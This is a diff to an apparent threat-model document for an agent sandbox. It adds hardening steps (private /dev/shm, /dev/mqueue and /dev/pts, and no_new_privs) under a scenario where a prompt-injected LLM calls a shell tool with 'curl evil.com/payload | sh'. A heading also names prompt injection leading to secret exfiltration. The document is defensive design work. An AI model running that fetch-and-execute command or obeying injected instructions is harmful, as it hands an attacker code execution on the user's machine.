@@ -376,7 +376,8 @@ LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.
 Mitigations:
 - The shell child runs in a network namespace. The only route out is the proxy, reached through the proxy variables; a program that ignores them has no network.
 - The proxy checks `evil.com` against the call's host rules → denied (403).
-- System directories are mounted read-only. A written file lands only in the workspace, `/tmp` scratch, or a `write_path` grant.
+- System directories are mounted read-only. A written file lands only in the workspace, `/tmp` scratch, or a `write_path` grant; `/dev/shm`, `/dev/mqueue` and `/dev/pts` are private per call, never the host's.
+- `no_new_privs` is set on every sandboxed tool child: a setuid binary does not elevate.
 
 ### Prompt injection → secret exfiltration
 
